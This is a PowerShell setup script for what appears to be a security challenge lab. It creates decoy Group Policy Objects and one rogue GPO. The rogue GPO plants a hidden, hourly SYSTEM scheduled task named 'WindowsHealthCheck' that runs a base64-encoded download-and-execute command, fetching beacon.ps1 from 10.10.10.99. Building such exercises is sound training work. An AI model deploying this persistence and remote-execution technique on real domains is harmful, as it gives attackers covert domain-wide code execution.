# plant-backdoors.ps1
# Plants a weaponized GPO among several legitimate-looking decoys.
# DO NOT READ THIS FILE BEFORE ATTEMPTING THE CHALLENGE

Write-Host "=== Setting up challenge scenario ==="

$ProgressPreference = 'SilentlyContinue'
Import-Module GroupPolicy -ErrorAction SilentlyContinue

Start-Sleep -Seconds 30

# --- Decoy 1: legitimate-looking wallpaper policy ---
$decoy1 = New-GPO -Name "Desktop Wallpaper Standard"
$decoy1 | Set-GPRegistryValue -Key "HKCU\Control Panel\Desktop" -ValueName "Wallpaper" -Type String -Value "C:\Windows\Web\Wallpaper\corp-standard.jpg" | Out-Null

# --- Decoy 2: legitimate-looking screensaver timeout policy ---
$decoy2 = New-GPO -Name "Screen Lock Timeout Policy"
$decoy2 | Set-GPRegistryValue -Key "HKCU\Control Panel\Desktop" -ValueName "ScreenSaveTimeOut" -Type String -Value "600" | Out-Null

# --- Decoy 3: legitimate-looking IE/Edge homepage policy ---
$decoy3 = New-GPO -Name "Browser Homepage Configuration"
$decoy3 | Set-GPRegistryValue -Key "HKCU\Software\Policies\Microsoft\Internet Explorer\Main" -ValueName "Start Page" -Type String -Value "https://intranet.corp.local" | Out-Null

# --- Rogue GPO: pushes a hidden Scheduled Task via Group Policy Preferences ---
$rogue = New-GPO -Name "Workstation Compliance Baseline"
$sysvolPath = "C:\Windows\SYSVOL\domain\Policies\{$($rogue.Id)}\Machine\Preferences\ScheduledTasks"
New-Item -Path $sysvolPath -ItemType Directory -Force | Out-Null

$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.99/beacon.ps1')"))
$taskXml = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
	<TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="WindowsHealthCheck" image="0" changed="2024-01-15 09:30:00" uid="{ABCDEF01-2345-6789-ABCD-EF0123456789}">
		<Properties action="C" name="WindowsHealthCheck" runAs="SYSTEM" logonType="S4U">
			<Task version="1.3">
				<RegistrationInfo>
					<Author>NT AUTHORITY\SYSTEM</Author>
					<Description>Periodic health telemetry check</Description>
				</RegistrationInfo>
				<Principals>
					<Principal id="Author">
						<UserId>SYSTEM</UserId>
						<RunLevel>HighestAvailable</RunLevel>
					</Principal>
				</Principals>
				<Settings>
					<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
					<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
					<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
					<AllowHardTerminate>true</AllowHardTerminate>
					<StartWhenAvailable>true</StartWhenAvailable>
					<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
					<Enabled>true</Enabled>
					<Hidden>true</Hidden>
				</Settings>
				<Triggers>
					<TimeTrigger>
						<Repetition>
							<Interval>PT1H</Interval>
							<StopAtDurationEnd>false</StopAtDurationEnd>
						</Repetition>
						<StartBoundary>2024-01-15T09:30:00</StartBoundary>
						<Enabled>true</Enabled>
					</TimeTrigger>
				</Triggers>
				<Actions Context="Author">
					<Exec>
						<Command>powershell.exe</Command>
						<Arguments>-WindowStyle Hidden -ep bypass -enc $encodedCommand</Arguments>
					</Exec>
				</Actions>
			</Task>
		</Properties>
	</TaskV2>
</ScheduledTasks>
"@
Set-Content -Path "$sysvolPath\ScheduledTasks.xml" -Value $taskXml
$rogue | New-GPLink -Target "DC=corp,DC=local" | Out-Null

Write-Host "=== Challenge scenario ready ==="
Write-Host "GPOs created: 3 legitimate, 1 rogue"
